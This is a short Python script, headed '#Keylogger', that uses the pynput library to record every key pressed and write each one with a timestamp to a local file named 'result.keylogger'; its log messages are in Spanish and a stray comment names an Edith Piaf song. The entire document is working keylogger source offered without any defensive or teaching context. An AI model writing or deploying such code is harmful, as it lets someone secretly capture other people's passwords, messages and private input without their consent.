#Keylogger
import logging
from pynput.keyboard import Listener


#Milord by Edith Piaf

logging.basicConfig(filename="result.keylogger", level=logging.DEBUG, format="%(asctime)s : %(message)s ")

def keystroke(key):
    logging.info("Se a pulsado la tecla: {0}".format(key))


with Listener(on_press=keystroke) as input_keyboard:
    
    input_keyboard.join()